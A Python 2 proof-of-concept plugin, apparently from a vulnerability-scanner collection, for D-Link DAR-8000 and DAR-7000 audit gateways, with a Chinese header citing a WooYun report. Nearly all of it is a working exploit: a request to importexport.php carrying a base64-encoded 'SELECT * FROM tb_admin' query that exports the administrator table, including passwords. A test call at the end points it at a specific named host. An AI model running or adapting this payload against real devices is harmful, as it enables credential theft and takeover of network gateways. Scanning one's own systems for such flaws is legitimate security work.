#!/usr/bin/env python
# coding: UTF-8

'''
author: yichin
name: D-Link任意SQL执行(可直接获取管理员密码)
refer: http://www.wooyun.org/bugs/wooyun-2010-0135939
description:
    影响“DAR-8000 系列上网行为审计网关”和“DAR-7000 系列上网行为审计网关”两款网关。
'''

import re
import urlparse

from ..miniCurl import Curl
from ..t  import T


class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        payload = arg + 'importexport.php?sql=U0VMRUNUICogRlJPTSB0Yl9hZG1pbg%3D%3D&tab=tb_admin&type=exportexcelbysql'
        code, head, res, err, _ = curl.curl2(payload)
        if code == 200 and '[admin]' in res:
            output('SQL execution: '+payload,result,'hole')
        

        del curl
        return result


def output(url,result,label):
    info = url + '  d-link  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='d-link Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/d-link/d-link_342067c30fc72684bc43d2c7b44a7b2e.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/d-link/d-link_342067c30fc72684bc43d2c7b44a7b2e.py
#/root/github/poccreate/codesrc/exp-2024.py